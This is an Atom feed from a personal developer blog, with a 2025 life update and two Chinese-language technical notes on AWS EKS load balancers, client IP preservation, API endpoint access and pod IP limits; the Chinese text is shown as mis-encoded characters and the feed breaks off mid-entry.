<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiyu&#39;s Dev Blog</title>
  
  <subtitle>ğŸ–ï¸</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.yiyu0x.org/"/>
  <updated>2025-04-12T21:12:40.789Z</updated>
  <id>https://blog.yiyu0x.org/</id>
  
  <author>
    <name>yiyu0x</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025 Life Update</title>
    <link href="https://blog.yiyu0x.org/2025/04/12/"/>
    <id>https://blog.yiyu0x.org/2025/04/12/</id>
    <published>2025-04-12T12:04:54.000Z</published>
    <updated>2025-04-12T21:12:40.789Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="è¿‘æ³"><a href="#è¿‘æ³" class="headerlink" title="è¿‘æ³"></a>è¿‘æ³</h2><p>è·é›¢ä¸Šä¸€ç¯‡æ–‡ç« æ›´æ–°å·²ç¶“è¶…éå…©å¹´ã€‚å‰å¹¾å¤©å‰›å¥½åœ¨ CloudFlare ä¸Šé¢èª¿æ•´ DNS Records ç™¼ç¾é€™å€‹ blog çš„æ¯é€±è§£ææ•¸é‡é‚„æ˜¯æœ‰å¤šé”åƒäººï¼Œå› æ­¤æˆ‘è¦ºå¾—éœ€è¦æ›´æ–°ä¸€ä¸‹è¿‘æ³è®“é•·æœŸæœ‰åœ¨å°ˆæ³¨è©² blog çš„å„ä½çŸ¥é“æœ¬ç«™ç›®å‰çš„ç‹€æ³ã€‚</p><p>ç”±æ–¼ä¸€ä¸‹è·æ¶¯ä¸Šçš„é•·æœŸè€ƒé‡ï¼Œæˆ‘å¾å°åŒ—çš„ AWS é›¢è·ï¼Œç¾åœ¨æ­£åœ¨åŒ—ç¾å°‹æ‰¾æ›´å¤šæ©Ÿæœƒã€‚è€Œå°ˆæ³¨çš„äº‹æƒ…ä¹Ÿæš«æ™‚å¾é›²ç«¯åŸºç¤è¨­æ–½ç®¡ç†æ…¢æ…¢è½‰å‘ AI å·¥å…·å¦‚ä½•å¹«åŠ©é–‹ç™¼è€…æ›´å¿«å®Œæˆç›®æ¨™ã€‚AI çš„å¿«é€Ÿç™¼å±•å¤§å¹…ç¸®çŸ­äº†é–‹ç™¼ç”¢å“æ‰€éœ€è¦çš„æ™‚é–“ï¼Œé›–ç„¶é›²ç«¯åŸºç¤è¨­æ–½é ˜åŸŸé‚„æ²’æœ‰å‘å‚³çµ±é–‹ç™¼é ˜åŸŸä¸€æ¨£å—åˆ°åš´é‡è¡æ“Šï¼Œä½†æ˜¯å¯é è¦‹çš„å°‡ä¾†é€™ä¸€å¤©é²æ—©æœƒç™¼ç”Ÿã€‚è€Œæˆ‘ä¹Ÿéå¸¸æœŸå¾…çœ‹åˆ°é€™ä¸€å¤©çš„åˆ°ä¾†ï¼Œåˆ°æ™‚å€™æœƒæœ‰å¤§é‡çš„æ–°å‹æ…‹é–‹ç™¼è€…æœ‰èƒ½åŠ›é–‹ç™¼å‡ºå„å¼å„æ¨£çš„è»Ÿé«”æœå‹™ã€‚</p><p>å¾ 2022 å¹´å·¥ä½œä¹‹å¾Œæˆ‘å·²ç¶“å¾ˆå°‘æ›´æ–° blog æ–‡ç« ã€‚åŸå› é™¤äº†æ¥è§¸åˆ°çš„æœå‹™éƒ½æ˜¯èˆ‡ AWS EKS æœ‰é—œä»¥å¤–ï¼Œç”±æ–¼ä¸€äº›å…¬å¸ä¸Šçš„æ”¿ç­–ï¼Œå¯«å¤ªå¤šæŠ€è¡“ç´°ç¯€å¯èƒ½æˆ–å¤šæˆ–å°‘æœƒé€æ¼åˆ°å®¢æˆ¶çš„åŸºç¤è¨­æ–½æ¶æ§‹ã€‚å› æ­¤ä¾¿å¾ˆå°‘é€²è¡Œæ–‡ç« æ›´æ–°ã€‚å¦å¤–ä¸€é»æ˜¯å·¥ä½œä¹‹å¾Œï¼Œæˆ‘å¾ˆå°‘åœ¨é›»è…¦ä¸Šé€²è¡Œå¤ªå¤šå€‹äººåŒ–è¨­å®šä»¥åŠé‘½ç ”å…¶ä»–åº•å±¤æŠ€è¡“ï¼ˆåŒæ¨£å› ç‚ºå…¬å¸æ”¿ç­–ï¼‰ã€‚</p><p>ç„¶è€Œåˆ°äº†åŒ—ç¾ä¹‹å¾ŒåŸæœ¬ä»¥ç‚ºæœƒæœ‰æ™‚é–“ç¹¼çºŒé€²è¡Œä¸€äº›æ›´æ–°ï¼Œä½†æ˜¯ç”±æ–¼æ‰¾å¯¦ç¿’ä»¥åŠå…¶ä»–é›œäº‹èŠ±æ‰äº†æˆ‘å¤§é‡çš„æ™‚é–“ä»¥å¤–ã€‚å¦å¤–åœ¨åŒ—ç¾æ‰¾å¯¦ç¿’ä¸å¤–ä¹å°±æ˜¯æº–å‚™ Leetcode åˆ·é¡Œï¼Œè€Œé€™å€‹éç¨‹å°æ–¼ä¾†èªªæŒºæ¯ç‡¥ä¹å‘³ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ‡‰è©²å¯«äº›ä»€éº¼ä¾†åˆ†äº«ï¼Œè‡³å°‘æˆ‘å€‹äººå°æ–¼é€™å€‹éç¨‹æ²’ä»€éº¼ç†±æƒ…ã€‚åªæ˜¯ç‚ºäº†æ‹¿ Offer è€Œå»åˆ·é¡Œã€‚</p><p>å‰›å¥½ 4 æœˆæ˜¯ä¸€å€‹æ–°å­¸æœŸçš„é–‹å§‹ï¼Œæ‰¾å¯¦ç¿’ä¹Ÿåˆ°ä¸€å€‹æ®µè½ã€‚æˆ‘æœ‰æ›´å¤šæ™‚é–“å¯ä»¥å°ˆæ³¨åœ¨ä¸€äº› AI é ˜åŸŸçš„æƒ³æ³•ä¸Šï¼Œä»¥åŠç”¨å¿ƒå»å¥½å¥½é«”é©—åœ¨åŒ—ç¾çš„ç”Ÿæ´»ã€‚å› æ­¤æœ‰äº†é€™ä¸€ç¯‡æ›´æ–°çš„èª•ç”Ÿã€‚</p><p>è‹¥èº«ç‚ºè®€è€…ä½ æœ‰æƒ³æ³•æˆ–æ˜¯ä¸€äº›ç–‘å•æƒ³è¦äº¤æµï¼Œæ­¡è¿ç›´æ¥è¯çµ¡æˆ‘ï¼ˆä½ å¯ä»¥é€éä¸€äº›é€£çµæ‰¾åˆ°æˆ‘çš„è¯çµ¡æ–¹å¼çš„ï¼‰ğŸ“§</p><p>ï¼ˆä»¥ä¸‹æ˜¯è‹±æ–‡ç‰ˆæœ¬ï¼‰</p><h2 id="Life-Update"><a href="#Life-Update" class="headerlink" title="Life Update"></a>Life Update</h2><p>Itâ€™s been more than two years since my last blog post. A few days ago, while I was updating some DNS records on Cloudflare, I noticed that this blog still gets thousands of DNS queries every week. That made me feel itâ€™s time for an update â€” especially for those whoâ€™ve been following this blog for a while.</p><p>For long-term career reasons, I decided to leave AWS in Taipei and am now exploring new opportunities in North America. My focus has also shifted gradually â€” from managing cloud infrastructure to exploring how AI tools can help developers build faster and more efficiently. The rapid growth of AI has already shortened product development cycles a lot. While cloud infrastructure hasnâ€™t been impacted as heavily as traditional software engineering (yet), itâ€™s only a matter of time. Iâ€™m genuinely excited to see what the future holds â€” I believe many new types of developers will soon be able to create all kinds of software services with the help of AI.</p><p>Since I started working in 2022, Iâ€™ve rarely updated this blog. One reason is that most of my work involved AWS EKS. Because of company policies, writing about technical details might accidentally expose parts of our clientsâ€™ infrastructure, so I avoided publishing too much. Another reason is that after starting full-time work, I rarely tinkered with my personal setup or explored low-level tech (again, mostly due to company rules).</p><p>After moving to North America, I originally thought Iâ€™d have more time to write again. But job hunting â€” especially looking for internships â€” took up a lot of time. And to be honest, prepping for internships here mostly means grinding Leetcode. I find that process pretty dry and uninspiring, so I didnâ€™t really know what to share. I was solving problems not out of interest, but just to get an offer.</p><p>Now that itâ€™s April â€” the start of a new academic term â€” and my internship search is mostly done, I finally have more time to focus on AI-related ideas and enjoy life here in North America. Thatâ€™s what motivated me to write this update.</p><p>If youâ€™re a reader and have any thoughts or questions youâ€™d like to discuss, feel free to reach out to me directly (you can find my contact info through the links on this blog) ğŸ“§</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://blog.yiyu0x.org/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>EKS ELB ç²å– Client IP æ–¹æ³•ç´€éŒ„</title>
    <link href="https://blog.yiyu0x.org/2022/09/05/"/>
    <id>https://blog.yiyu0x.org/2022/09/05/</id>
    <published>2022-09-05T06:13:08.000Z</published>
    <updated>2025-04-12T20:59:43.585Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ EKS ä¸Šè¦å»ºç«‹ ELB æœƒæ¡ç”¨ service type æŒ‡å®š LoadBalancerã€‚æ­¤æ™‚ AWS çš„ In-Tree LoadBalacner Controller æˆ–æ˜¯ <a href="https://github.com/kubernetes-sigs/aws-load-balancer-controller" target="_blank" rel="noopener">AWS Load Balancer Controller</a> å…¶ä¸­ä¹‹ä¸€æœƒå”åŠ©æˆ‘å€‘å»ºç«‹å°æ‡‰çš„ ELB å‡ºä¾†ã€‚æœ¬æ–‡ç´€éŒ„é€™å…©ç¨® LB Controller çš„å·®ç•°ä»¥åŠä¸åŒé¡å‹ ELB ä½¿ç”¨æ™‚æ©Ÿï¼ˆä»¥ç²å– Client IP ç‚ºä¾‹ï¼‰ã€‚</p><h2 id="In-Tree-LoadBalacner-Controller-CLB"><a href="#In-Tree-LoadBalacner-Controller-CLB" class="headerlink" title="In-Tree LoadBalacner Controller - CLB"></a>In-Tree LoadBalacner Controller - CLB</h2><p>å°‡ server type æŒ‡å®šæˆ <code>LoadBalancer</code> æ­¤æ™‚ In-Tree LoadBalacner Controller æœƒ privosion ä¸€å€‹ CLB å‡ºä¾†</p><p>æµé‡å¾å¤–éƒ¨è¦é€²å…¥å¢é›†çš„è·¯å¾‘ç‚º</p><p>CLB -> Node:NodePort -> Pod maybe in different node</p><p>å› ç‚ºé€éç¯€é»ä¸Šçš„ NodePort é€²è¡Œè·³è½‰ï¼Œæ‰€ä»¥ Pod å¦‚æœè¦ç²å¾— Clinet IP æœƒæ‹¿åˆ° Node ä¸­çš„ IPã€‚è€Œç²å–ä¸åˆ°çœŸæ­£çš„ Client IP</p><p>æ¥è‘—å¯ä»¥æ ¹æ“šå®˜æ–¹å»ºè­°è¨­å®š <code>.spec.externalTrafficPolicy</code> ç‚º <code>Local</code>ï¼ˆé è¨­ç‚º <code>Cluster</code>ï¼‰</p><p>é€™æ¨£çš„è¨­å®šå¯ä»¥é¿å…æµé‡é€²å…¥åˆ°æ²’æœ‰å« Destination Pod çš„ Node ä¸Šï¼Œå¤šåšä¸€å€‹ hop çš„è·³è½‰ï¼Œä¹Ÿé¿å… IP è¢«æ´—æˆè©² Node çš„ IP</p><p>çµæœç™¼ç¾ Client IP é‚„æ˜¯ç²å–ä¸åˆ°ï¼Œå› ç‚º CLB åœ¨èˆ‡å¾Œæ–¹çš„ instance æºé€šæ™‚ï¼Œæ˜¯ç”¨è©² subnet ä»‹é¢çš„ IP æºé€šï¼Œæ‰€ä»¥ Client IP è®Šæˆæ˜¯ ELB çš„ private IPï¼ˆè©² IP å¯ä»¥å¾ ec2 çš„ network interfacae æ‰¾å‡ºä¾†ï¼‰</p><p>ç¾åœ¨çš„è·¯å¾‘è®Šæˆ</p><p>CLB -> Node:NodePort ï¼ˆPod also in the nodeï¼‰</p><p>é–‹å•Ÿäº† <code>externalTrafficPolicy</code> éœ€ä¸éœ€è¦æ“”å¿ƒå¦‚æœè©²ç¯€é»ä¸Šæ²’æœ‰ Podï¼Œé€²è€Œè«‹æ±‚æ²’æœ‰è¾¦æ³•è·¯ç”±åˆ°æ­£ç¢ºçš„ä½ç½®ä¸Š</p><p>ç­”æ¡ˆæ˜¯ä¸éœ€è¦ï¼Œå› ç‚º CLB æœƒå°å¾Œæ–¹çš„ instance åšå¥åº·æª¢æŸ¥ï¼Œè‹¥å¾Œæ–¹ instance æ²’æœ‰ Podï¼Œé‚£æŸè©² instance ä¸å¥åº·ï¼Œæµé‡è‡ªç„¶ä¸æœƒå°å…¥éå»</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å„ªé»ï¼šå®Œå…¨ä¸éœ€ä¿®æ”¹åƒæ•¸ã€ä¸éœ€å®‰è£å…¶ä»– controller</span><br><span class="line">ç¼ºé»ï¼šç„¡æ³•ä¿ç•™ Client IPã€ä¸ä¿ç•™ Client IP æµé‡æœƒå¤šä¸€è·³ã€æµé‡ä¸å¹³å‡ï¼ˆå¾Œé¢æœƒæåˆ°ï¼‰</span><br></pre></td></tr></tbody></table></figure><h2 id="In-Tree-LoadBalacner-Controller-NLB"><a href="#In-Tree-LoadBalacner-Controller-NLB" class="headerlink" title="In-Tree LoadBalacner Controller - NLB"></a>In-Tree LoadBalacner Controller - NLB</h2><p>éœ€è¦åœ¨ annotations åŠ ä¸Š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">annotations:</span></span><br><span class="line">    <span class="string">service.beta.kubernetes.io/aws-load-balancer-type:</span> <span class="string">"nlb"</span></span><br></pre></td></tr></tbody></table></figure><p>ä¸¦ä¸”æˆ‘å€‘å°‡ <code>externalTrafficPolicy</code> åŒæ¨£è¨­å®šæˆ <code>Local</code></p><p>ç™¼ç¾å°±å¯ä»¥æ­£å¸¸ç²å– Client IP äº†ï¼Œä»£è¡¨ NLB åœ¨è½‰ç™¼æ™‚ï¼Œä¸æœƒå°‡ Source IP ä»‹é¢åˆ‡æ›æˆå…§ç¶²ä»‹é¢ï¼ŒåŒæ™‚å¾Œç«¯ä¹Ÿä¸æ˜¯ instance æ˜¯å¦å¤–ä¸€å±¤æŠ½è±¡ï¼ˆtarget groupï¼‰</p><p>ä½†è©¦æƒ³ä¸€å€‹ä¸€å€‹æƒ…æ³ï¼Œè‹¥æˆ‘æœ‰ 3 å€‹ Pod (x, y, z)ï¼Œ2 å€‹ (x, y) è½åœ¨ç¯€é» Aï¼Œ1 å€‹ (z) è½åœ¨ç¯€é» B</p><p>é‚£éº¼æµé‡é€²å…¥ NLB æ™‚æœƒå…ˆé€²è¡Œ 1/2 çš„æ©Ÿç‡é¸æ“‡ç¯€é» (A, B)ï¼Œå‡è¨­é€²å…¥ç¯€é» A åˆæœƒæœ‰ 1/2 çš„æ©Ÿç‡é¸æ“‡ x, y é€™å…©å€‹ Pod</p><p>é‚£éº¼ Pod è¢«é¸ä¸­çš„æ©Ÿç‡è®Šæˆ</p><p>x: 1/2 * 1/2 = 1/4<br>y: 1/2 * 1/2 = 1/4<br>z: 1/2</p><p>å¯ä»¥ç™¼ç¾æµé‡ä¸¦æ²’æœ‰çœŸçš„å¹³å‡è½‰ç™¼éƒ½å¾Œç«¯çš„ Pod ä¸Š</p><p>ä½† In-Tree Controller åªèƒ½å»ºç«‹å‡ºé€™å…©ç¨® ELBï¼ˆä¸¦ä¸”èƒ½ä¿®æ”¹çš„åƒæ•¸æœ‰é™ï¼‰ï¼Œå‰©ä¸‹ä¸€ç¨® ALB å¿…é ˆå®‰è£ <a href="https://github.com/kubernetes-sigs/aws-load-balancer-controller" target="_blank" rel="noopener">AWS Load Balancer Controller</a></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å„ªé»ï¼šä¸éœ€å®‰è£å…¶ä»– controllerã€å¯ä»¥ä¿ç•™ Client IP</span><br><span class="line">ç¼ºé»ï¼šä¸ä¿ç•™ Client IP æµé‡æœƒå¤šä¸€è·³ã€æµé‡ä¸å¹³å‡</span><br></pre></td></tr></tbody></table></figure><h2 id="AWS-Load-Balancer-Controller-NLB"><a href="#AWS-Load-Balancer-Controller-NLB" class="headerlink" title="AWS Load Balancer Controller - NLB"></a>AWS Load Balancer Controller - NLB</h2><p>å®‰è£ AWS Load Balancer Controller å¾Œï¼Œåœ¨ä½¿ç”¨ä¸Šå¿…é ˆæŒ‡å®š <code>loadBalancerClass: service.k8s.aws/nlb</code></p><p>ä¸¦ä¸” AWS Load Balancer Controller æœ‰æä¾› <code>ip</code> èˆ‡ <code>instance</code> modeï¼ˆä½¿ç”¨ in-tree controller å»ºç«‹å‡ºä¾†çš„ mode å°±æ˜¯ instance modeï¼‰</p><p><em>è©²åŠŸèƒ½éœ€è¦é…åˆ AWS VPC CNI ä½¿ç”¨</em></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">annotations:</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip</span><br><span class="line">spec:</span><br><span class="line">    loadBalancerClass: service.k8s.aws/nlb</span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ™‚æœƒç™¼ç¾ NLB å¾Œæ–¹çš„ target group ç›´æ¥å°æ‡‰åˆ° Pod IPï¼Œå¯ä»¥çœå»å¤šä¸€æ¬¡è·³è½‰ï¼Œä¸¦ä¸”è§£æ±ºæµé‡ä¸å¹³å‡çš„å•é¡Œ</p><p>ä½† Client IP é‚„æ˜¯æ²’æœ‰ä¿ç•™ï¼Œæˆ‘å€‘å¯ä»¥èª¿æ•´ NLB åƒæ•¸</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">annotations:</span><br><span class="line">    service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: preserve_client_ip.enabled=true</span><br></pre></td></tr></tbody></table></figure><p>å°‡ NLB æä¾›çš„åŠŸèƒ½ preserve_client_ip æ‰“é–‹ï¼Œå³å¯å®Œæˆé…ç½®ï¼Œä¹Ÿä¸éœ€è¦é€éè¨­å®š <code>externalTrafficPolicy</code> åƒæ•¸å³å¯ç²å– Client IP</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å„ªé»ï¼šä¿ç•™ Client IPã€æµé‡ä¸æœƒå¤šä¸€è·³ã€æµé‡å¹³å‡</span><br><span class="line">ç¼ºé»ï¼šéœ€å®‰è£å…¶ä»– controller</span><br></pre></td></tr></tbody></table></figure><h2 id="AWS-Load-Balancer-Controller-ALB"><a href="#AWS-Load-Balancer-Controller-ALB" class="headerlink" title="AWS Load Balancer Controller - ALB"></a>AWS Load Balancer Controller - ALB</h2><p>ä½¿ç”¨ Ingress è³‡æºå»ºç«‹å‡º ALBï¼Œä½†æ˜¯ç„¡æ³•è¨­å®š <code>preserve_client_ip</code></p><p>å¦‚æœå» management console æª¢æŸ¥å°æ‡‰ target groupï¼Œæœƒç™¼ç¾æ‰¾ä¸åˆ° Preserve client IP addresses ä½†æ˜¯å¤šäº† Load balancing algorithm å¯ä»¥é¸æ“‡</p><p>å› ç‚ºæ˜¯ L7 æ”¯æ´ï¼Œæ‰€ä»¥å°‡ Client IP æ”¾å…¥ HTTP header çš„ XFF æ¬„ä½å³å¯</p><p>ä¸€æ¨£æœ‰ <code>instance</code> èˆ‡ <code>ip</code> mode å¯ä»¥é¸æ“‡</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å„ªé»ï¼šä¿ç•™ Client IPï¼ˆæ”¾åœ¨ L7 çš„ HTTP header ä¸­ï¼‰ã€æµé‡ä¸æœƒå¤šä¸€è·³ã€æµé‡å¹³å‡</span><br><span class="line">ç¼ºé»ï¼šéœ€å®‰è£å…¶ä»– controller</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="AWS" scheme="https://blog.yiyu0x.org/tags/AWS/"/>
    
      <category term="EKS" scheme="https://blog.yiyu0x.org/tags/EKS/"/>
    
      <category term="ELB" scheme="https://blog.yiyu0x.org/tags/ELB/"/>
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>å»ºç«‹ Reliable EKS è¨˜éŒ„</title>
    <link href="https://blog.yiyu0x.org/2022/08/30/"/>
    <id>https://blog.yiyu0x.org/2022/08/30/</id>
    <published>2022-08-30T12:04:21.000Z</published>
    <updated>2025-04-12T20:59:43.593Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>EKS çš„å»ºç«‹æ–¹ä¾¿å¿«é€Ÿï¼Œå…¶ä¸­æœ‰äº›æ¦‚å¿µèŠ±äº†äº›æ™‚é–“æ‰é‡æ¸…ï¼Œç”šè‡³æœ‰äº›æ‹“å¢£ä¸€é–‹å§‹æƒ³éŒ¯äº†ã€‚ç¶“éå¹¾é€±æŸ¥é–±æ–‡ä»¶èˆ‡å¯¦é©—å¾Œï¼Œå¯«å€‹å°çš„ç¸½çµåšå€‹ç°¡å–®çš„ç´€éŒ„ã€‚</p><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><ul><li>EKS åªæœ‰ç¶­è­· Control Planeï¼ŒWorker æœ‰ EC2 èˆ‡ Fargate å¯ä»¥é¸æ“‡ã€‚å…¶ä¸­ EC2 å¿…é ˆç”±ä½¿ç”¨è€…è‡ªè¡Œç®¡ç†ã€‚</li><li>EKS Control Plane çš„ VPC èˆ‡ Cluster çš„ VPC ç‚ºä¸åŒçš„ VPC</li><li>å¦‚æœ EKS æœ‰é–‹å•Ÿ Private Accessï¼Œæœƒåœ¨ Cluster VPC çš„ subnet ä¸­å®‰æ’ EKS-managed ENI è®“ Cluster VPC æµé‡ç©¿é€è‡³ EKS ä¸­</li><li>EKS å»ºç«‹æ™‚é¸æ“‡çš„ VPC æ˜¯ç‚ºäº†éƒ¨ç½² EKS-managed ENIï¼ˆæœ€å°‘å…©å€‹ï¼‰ä½¿ç”¨</li><li>EKS-managed ENI ç›´æ¥å­˜åœ¨æ–¼ subnet ä¹‹ä¸­ï¼Œé EC2 instanceï¼ˆor å…¶ä»– instanceï¼‰ä¹‹ä¸Š</li></ul><h2 id="Nodegroup"><a href="#Nodegroup" class="headerlink" title="Nodegroup"></a>Nodegroup</h2><p>å¦‚æœ Nodegroup å®Œå…¨ç„¡æ³•å­˜å–å¤–ç¶²ï¼ŒåŒæ™‚ä¹Ÿå°±ç„¡æ³•æ‹‰å–å¿…è¦çš„ Container Imageï¼Œå°è‡´ç¯€é»ç„¡æ³•å»ºç«‹æˆåŠŸ</p><p>Nodegroup å¦‚æœè½åœ¨ private subnetï¼Œå¯ä»¥å¤šé–‹ä¸€å°æœ‰ public subnet çš„ EC2 ä½œç‚º bastion ä½¿ç”¨ï¼ˆåŒä¸€å€‹ VPC ä¸‹ï¼‰</p><h2 id="API-Endpoint"><a href="#API-Endpoint" class="headerlink" title="API Endpoint"></a>API Endpoint</h2><h3 id="public-access"><a href="#public-access" class="headerlink" title="public access"></a>public access</h3><p>API endpoint domain æœƒå°æ‡‰åˆ°ä¸€çµ„ Public IP åšç‚º API Endpoint å…¥å£</p><p>å¯ä»¥ä½¿ç”¨ <code>kubectl cluster-info</code> æŸ¥çœ‹</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@eks-bastion]$ kubectl cluster-info</span><br><span class="line">Kubernetes control plane is running at https://<your api endpoint uuid>.gr7.<region>.eks.amazonaws.com</span><br></pre></td></tr></tbody></table></figure><h3 id="private-access"><a href="#private-access" class="headerlink" title="private access"></a>private access</h3><p>æ ¹æ“š<a href="https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡ä»¶</a>æè¿°ï¼Œåœ¨ Cluster VPC ä¸‹æœƒæœ‰ Route 53 private hosted zone å°‡ API endpoint è§£ææˆè©² VPC ä¸‹çš„ IP</p><blockquote><p>This private hosted zone is managed by Amazon EKS, and it doesnâ€™t appear in your accountâ€™s Route 53 resources.</p></blockquote><p>ç¶“éå¯¦é©—æœƒç™¼ç¾è§£å‡ºå…©çµ„ VPC ä¸­çš„ private IPï¼ŒåŒæ™‚ç‚º EKS-managed ENI çš„ IP</p><p>é€™çµ„ä»‹é¢å¯ä»¥é€éå°‡ Cluster VPC çš„æµé‡ç›´æ¥å°å‘è‡³ EKS VPC ä¹‹ä¸­</p><p>å•Ÿç”¨æ¢ä»¶ç‚º Cluster VPC å¿…é ˆå°‡ <code>enableDnsHostnames</code>, <code>enableDnsSupport</code> è¨­å®šç‚º <code>true</code></p><p>ä¸¦ä¸” <code>AmazonProvidedDNS</code> è¦åœ¨ VPC DHCP çš„ domain name servers list</p><h3 id="public-and-private-access"><a href="#public-and-private-access" class="headerlink" title="public and private access"></a>public and private access</h3><p>å¤–ç¶²å› ç‚ºæ²’æœ‰ Route 53 private hosted zone æ‰€ä»¥æœƒè§£æå‡ºå¤–ç¶² IP</p><p>Cluster VPC ä¸‹æœ‰ Route 53 private hosted zone æ‰€ä»¥æœƒè§£æå‡º EKS-managed ENI çš„ IP</p><h2 id="Pod-Amount-Limit"><a href="#Pod-Amount-Limit" class="headerlink" title="Pod Amount Limit"></a>Pod Amount Limit</h2><p>Pod limit çš„æ ¹æœ¬å•é¡Œæ˜¯å› ç‚ºä¸åŒçš„ EC2 instance type æœ‰å…ˆå¤©çš„ VPC IP æ•¸é‡é™åˆ¶</p><p>ENI çš„æ•¸é‡æœ‰é™åˆ¶ï¼Œæ¯ä¸€å€‹ ENI instance å¯ä»¥æŒ‡å®šçš„ IP æ•¸é‡ä¹Ÿæœ‰é™åˆ¶</p><p>å®˜æ–¹æœ‰çµ¦å‡ºä¸€ä»½è¨ˆç®—å¾Œçš„é™åˆ¶åˆ—è¡¨å¯ä»¥é€²è¡ŒæŸ¥é–± <a href="https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt" target="_blank" rel="noopener">eni-max-pods.txt</a></p><p>çªç ´é™åˆ¶å‰å…ˆé‡æ¸…è‡ªå·±çš„å¢é›†ç‚ºä½•è¢«é™åˆ¶ï¼Œä»¥ä¸‹ç‚ºå¹¾ç¨®å¯èƒ½</p><h3 id="limited-by-subnet-CIDR"><a href="#limited-by-subnet-CIDR" class="headerlink" title="limited by subnet CIDR"></a>limited by subnet CIDR</h3><p>subnet çš„ CIDR ä¸€é–‹å§‹åˆ‡å¤ªå°ï¼Œå°è‡´ Pod æ•¸é‡è¶…é CIDR ç¯„åœæ™‚ï¼Œåƒè€ƒ VPC CNI çš„ <a href="https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt" target="_blank" rel="noopener">AWS_VPC_K8S_CNI_CUSTOM_NETWORK_CFG</a> åƒæ•¸ï¼Œä¾†å®¢è£½åŒ– Pod çš„ CIDRã€‚</p><h3 id="limited-by-EC2-instance-type"><a href="#limited-by-EC2-instance-type" class="headerlink" title="limited by EC2 instance type"></a>limited by EC2 instance type</h3><p>æœ€å¸¸è¦‹çš„æƒ…æ³ï¼Œé”åˆ° EC2 ä¸Šçš„ IP æ•¸é‡é™åˆ¶ï¼Œå› æ­¤ VPC CNI ç„¡æ³•æˆåŠŸç´¢å– IPã€‚</p><p>æ–¹æ³•ä¸€ï¼š</p><p>ç›´æ¥æŠ½æ› AWS VPC CNIï¼Œæ›æ‰ä¹‹å¾Œ Node å°±ä¸æœƒå†æŒçºŒç´¢å– secondary private IPv4 addressesï¼Œä¸éæŠ½æ›å¾Œï¼Œæ²’æœ‰è¾¦æ³•è®“ Pod çš„ IP ç›´æ¥å±¬æ–¼ VPC ä¸‹çš„ IPï¼ˆç†è«–æ•ˆèƒ½æœƒå·®ä¸€äº›ï¼Œæµé‡å¯èƒ½é ˆç¶“é NAT è½‰æ›ï¼‰ã€‚</p><p>æ–¹æ³•äºŒï¼š</p><p>ä½¿ç”¨ 2021 å¹´ EC2 æ–°æ¨å‡ºçš„åŠŸèƒ½ <code>prefix assignment</code>ã€‚é–‹å•Ÿ AWS VPC CNI ä¸­çš„ <code>ENABLE_PREFIX_DELEGATION</code> åƒæ•¸ã€‚å°‡æ¯ä¸€å€‹ ENI ä¸ŠåŸæœ¬å¯ä»¥é™„åŠ çš„ secondary private IPv4 addresses è®Šæˆè®Šç‚º /28 ç¯„åœï¼ˆ16 å€‹ IPsï¼‰ã€‚</p><p>åƒè€ƒ <a href="https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html" target="_blank" rel="noopener">Increase the amount of available IP addresses for your Amazon EC2 nodes</a></p><h3 id="limited-by-insufficient-IPâ€™s"><a href="#limited-by-insufficient-IPâ€™s" class="headerlink" title="limited by insufficient IPâ€™s"></a>limited by insufficient IPâ€™s</h3><p>è©² subnet ä¸‹çš„ IP 